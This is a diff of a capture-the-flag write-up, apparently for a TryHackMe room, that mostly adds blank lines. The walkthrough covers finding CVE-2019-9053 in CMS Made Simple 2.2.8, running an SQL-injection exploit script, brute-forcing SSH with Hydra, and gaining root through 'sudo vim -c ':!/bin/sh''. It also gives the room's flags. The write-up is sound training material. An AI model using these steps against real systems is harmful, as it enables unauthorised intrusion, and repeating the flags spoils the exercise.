@@ -68,6 +68,7 @@ Answer:
 
 ### What is running on the higher port?
 Our scan shows that port 2222 is running OpenSSH. So the answer:
+
 ```
 Answer:
 ssh
@@ -76,9 +77,13 @@ ssh
 ### What's the CVE you're using against the application? 
 In order to find what CVE we are going to use, we need to look through the site and see if we can find any possible vulnerabilities.
 
-I did some exploring through the pages that came up during my GoBuster scan. This was the first page that caught my interest: **http://{MACHINE_IP}/simple**
+I did some exploring through the pages that came up during my GoBuster scan. This was the first page that caught my interest: 
+**http://{MACHINE_IP}/simple**
+
 ![CMS Home Page](./screenshots/CMSMadeSimple.png)
+
 It appears that this site is using "CMS Made Simple (CMSMS)" as it's content-management-system(CMS). I scrolled down the page, and was able to find what version of this software is: 
+
 ![CMS Version](./screenshots/CMSMSVersion.png)
 
 The version of this software is: **CMS Made Simple version 2.2.8**
@@ -86,6 +91,7 @@ The version of this software is: **CMS Made Simple version 2.2.8**
 Now that we know the software and version, I tried searching through a linux terminal program called **SearchSploit**, this program is an awesome way to find vulnerabilities in a given software.
 
 In the terminal, I entered the following command:
+
 ```shell
 searchsploit 'CMS Made Simple 2.2.8'
 ```
@@ -101,10 +107,13 @@ CMS Made Simple < 2.2.10 - SQL Injection      | php/webapps/46635.py
 ```
 
 I looked up the Exploit Title on Google, and clicked on the following page:
+
 [exploit-db](https://www.exploit-db.com/exploits/46635)
+
 It lists near the top, that the CVE number is: 2019-9053.
 
 So the answer is:
+
 ```
 CVE-2019-9053 
 ```
@@ -130,11 +139,13 @@ python3 46635.py -u http://10.10.117.187/simple/ -w rockyou.txt -c
 ```
 
 This script was not very stable. I had to run it a few times, and I was never able to get it to crack the password as advertised. But I did successfully get the following info:
+
 ```	
 salt = 1dac0d92e9fa6bb2
 username = mitch
 email = admin@admin.com
 ```
+
 Since I do have the username, I used Hydra to crack the SSH password:
 
 **NOTE:** Don't forget that SSH is running on port **2222**, not the usual port **22**.
@@ -150,6 +161,7 @@ Got the password in less than a minute!
 ```
 
 So the password is:
+
 ```secret
 ```
 
@@ -162,72 +174,100 @@ ssh
 
 ### What's the user flag?
 I SSH'd into the machine with the following:
+
 ```
 ssh -p 2222 mitch@{MACHINE_IP}
 ```
+
 ...and I'm in!
 
 I type in the "ls" command, and I see the "user.txt" file. I then type "cat user.txt", and get the following:
+
 ```
 G00d j0b, keep up!
 ```
 
 ### Is there any other user in the home directory? What's its name?
 I typed in the following:
+
 ```
 ls ../
 ```
+
 and recieved the following:
+
 ```
 mitch  sunbath
 ```
+
 So the other user is
+
 ```
 sunbath
 ```
 
+
 ### What can you leverage to spawn a privileged shell?
 To start off, I checked to see what programs that the current user, mitch, could run:
+
 ```shell
 sudo -l
 ```
+
 ...and recieved the following:
+
 ```
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
+
 That was easy! It looks like **"vim"** is our answer!
 
 ### What's the root flag?
 Since we know that we are able to run Vim as root, I entered the following command:
+
 ```
 sudo vim -c ':!/bin/sh'
 ```
+
 This code starts Vim as super-user, then performs a command in Vim(as a super-user), and the command we performed is starting a shell. So, we'll see if we find any success...
 
 It returned the following:
+
 ![root screen](./screenshots/rootscreen.png)
+
 Never mind that gibberish on the right, that hash-mark on the very right is very promising! To verify if I'm root, I typed the following:
+
 ```shell
 whoami
 ```
+
 ...and recieved the following:
+
 ```
 root
 ```
+
 I am root!
+
 ![i am root](./iamroot.png)
+
 **Disclaimer:** I apologize, I know that was cheesy, but I couldn't resist.
 
 Now that I am root, I will search for the flag with the following script:
+
 ```
 find / -type f -name 'root.txt' 2>/dev/null
 ```
+
 ...and it returned:
+
 ```
 /root/root.txt
 ```
+
 ...open the file, and our flag is:
+
 ```
 W3ll d0n3. You made it!
 ```
